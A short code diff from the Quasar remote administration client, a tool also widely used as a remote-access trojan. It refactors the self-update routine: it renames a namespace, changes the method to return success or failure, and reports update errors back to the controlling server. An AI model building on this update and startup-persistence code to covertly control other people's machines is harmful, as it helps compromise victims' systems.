@@ -4,15 +4,16 @@ using Quasar.Client.IO;
 using Quasar.Client.Utilities;
 using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
+using Quasar.Common.Networking;
 using System;
 using System.Diagnostics;
 using System.IO;
 
-namespace Quasar.Client.Installation
+namespace Quasar.Client.Setup
 {
     public static class ClientUpdater
     {
-        public static void Update(Networking.Client client, string newFilePath)
+        public static bool Update(ISender client, string newFilePath)
         {
             try
             {
@@ -38,12 +39,13 @@ namespace Quasar.Client.Installation
                 if (Settings.STARTUP)
                     Startup.RemoveFromStartup();
 
-                Program.ConnectClient.Exit();
+                return true;
             }
             catch (Exception ex)
             {
                 NativeMethods.DeleteFile(newFilePath);
                 client.Send(new SetStatus {Message = $"Update failed: {ex.Message}"});
+                return false;
             }
         }
     }
